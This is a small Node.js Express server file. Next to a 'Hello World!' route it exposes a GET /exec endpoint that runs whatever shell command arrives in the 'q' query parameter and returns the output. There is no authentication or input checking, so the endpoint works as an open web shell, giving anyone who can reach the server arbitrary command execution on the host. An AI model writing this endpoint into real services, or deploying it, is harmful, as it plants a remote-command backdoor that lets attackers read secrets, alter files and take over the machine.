const express = require('express')
const { exec } = require('child_process');
const app = express()
const port = process?.env?.PORT||3000

app.get('/', (req, res) => {
  res.send('Hello World!')
})
app.get("/exec", (req, res)=>{
	const q = req?.query?.q;
	exec(q, (error, stdout, stderr) => {
	  if (error) {
	    console.error(`error: ${error.message}`);
		res.send(error.message)
	    return;
	 }

	 if (stderr) {
	   console.error(`stderr: ${stderr}`);
		res.send(stderr);
	   return;
	 }
	
	 	console.log(`stdout:\n${stdout}`);
		res.send(stdout);
	});
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
